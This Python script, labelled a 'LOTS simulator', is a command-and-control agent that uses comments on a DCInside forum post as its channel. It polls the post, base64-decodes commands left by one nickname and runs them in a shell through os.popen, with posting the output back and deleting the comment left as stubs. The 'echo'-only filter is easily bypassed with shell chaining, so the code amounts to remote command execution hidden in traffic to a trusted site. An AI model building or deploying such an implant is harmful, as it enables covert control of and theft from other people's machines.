import requests
import time
import os
import base64
from bs4 import BeautifulSoup

POST_URL = 'https://gall.dcinside.com/board/view/?id=leagueoflegends6&no=2746818'
ARTICLE_ID = '2746818'
GALLERY_ID = 'leagueoflegends6'
processed_comments = set()

def fetch_comments_ajax(article_id, gallery_id):
    url = 'https://gall.dcinside.com/board/comment/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36',
        'Referer': POST_URL,
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://gall.dcinside.com',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
    }
    data = {
        'id': gallery_id,
        'no': article_id,
        'comment_page': 1,
        'e_s_n': '',  # 보통 비워둬도 됨
    }
    res = requests.post(url, headers=headers, data=data)
    res.raise_for_status()
    # 응답은 JSON이지만, 'comment_list' 필드에 HTML이 들어있음
    comment_html = res.json().get('comment_list', '')
    soup = BeautifulSoup(comment_html, 'html.parser')
    comments = []
    for cmt in soup.select('.cmt_info.clear'):
        nick_tag = cmt.select_one('.nickname em[title]')
        comment_tag = cmt.select_one('.usertxt')
        if not nick_tag or not comment_tag:
            continue
        nick = nick_tag.get('title', '').strip()
        comment = comment_tag.get_text(strip=True)
        comments.append((nick, comment, cmt))
    return comments

def delete_comment(comment_box):
    print('[*] 댓글 삭제 요청 (구현 필요)')

def write_comment(result):
    print(f'[+] 결과 댓글 등록: {result} (구현 필요)')

def check_and_execute_commands(comments):
    for nick, comment, comment_box in comments:
        if (nick, comment) in processed_comments:
            continue
        processed_comments.add((nick, comment))
        if nick == 'ㅇㅇ':
            try:
                command = base64.b64decode(comment).decode('utf-8')
                print(f'[+] 명령어 감지(base64): {command}')
                if command.startswith('echo '):  # echo 명령만 허용 (예시)
                    output = os.popen(command).read()
                    print(f'[+] 명령어 결과: {output.strip()}')
                    write_comment(output.strip())
                else:
                    print('[!] 허용되지 않은 명령어입니다.')
                delete_comment(comment_box)
            except Exception as e:
                print(f'[!] base64 디코딩/실행 오류: {e}')

def main():
    print('[*] 디시인사이드 댓글 LOTS 시뮬레이터 시작됨...')
    try:
        while True:
            try:
                print('[*] 댓글 추출 중...')
                comments = fetch_comments_ajax(ARTICLE_ID, GALLERY_ID)
                check_and_execute_commands(comments)
            except Exception as e:
                print(f'[!] 오류 발생: {e}')
            time.sleep(5)
    except KeyboardInterrupt:
        print('\n[*] LOTS 시뮬레이터 종료됨.')

if __name__ == '__main__':
    main()